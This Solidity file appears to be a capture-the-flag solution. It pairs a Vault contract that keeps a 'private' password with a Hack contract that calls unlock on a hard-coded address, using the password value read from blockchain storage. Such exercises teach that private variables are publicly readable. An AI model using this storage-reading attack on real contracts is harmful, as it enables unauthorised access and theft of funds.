// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}

contract Hack{
    address target = 0x2e3f11CB1814734dd719954560ab011Ae5a00108;
    Vault vt = Vault(target);
    function attack() public{
        vt.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
    }
    function getStatus() public view returns(bool){
        return vt.locked();
    }
}